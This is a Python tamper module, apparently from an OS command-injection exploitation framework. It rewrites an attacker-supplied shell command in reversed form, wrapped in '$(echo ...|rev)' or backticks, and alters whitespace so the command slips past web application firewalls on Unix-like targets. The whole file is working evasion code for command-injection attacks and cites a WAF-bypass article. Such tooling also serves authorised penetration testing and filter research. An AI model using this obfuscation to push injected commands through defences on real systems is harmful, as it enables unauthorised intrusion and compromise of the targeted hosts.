#!/usr/bin/env python
# encoding: UTF-8

 

from src.utils import settings
from src.thirdparty.six.moves import urllib as _urllib

"""
About: Is used to reverse (characterwise) the user-supplied operating system commands.
Notes: This tamper script works against Unix-like target(s).
References: [1] https://github.com/stratusproject/stratus/issues/408
            [2] https://medium.com/picus-security/how-to-bypass-wafs-for-os-command-injection-2c5dd4e6a52b
"""

__tamper__ = "rev"

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

def tamper(payload):
  if settings.EXPLOITATION_PHASE:
    if settings.USER_APPLIED_CMD in settings.RAW_PAYLOAD:
      if settings.USE_BACKTICKS:
        rev_cmd = "`echo " + settings.USER_APPLIED_CMD[::-1] + "|rev`"
      else:
        rev_cmd = "$(echo " + settings.USER_APPLIED_CMD[::-1] + "|rev)"
      payload = settings.RAW_PAYLOAD.replace(settings.USER_APPLIED_CMD, rev_cmd).replace(settings.SINGLE_WHITESPACE, settings.WHITESPACES[0])
  return payload

# eof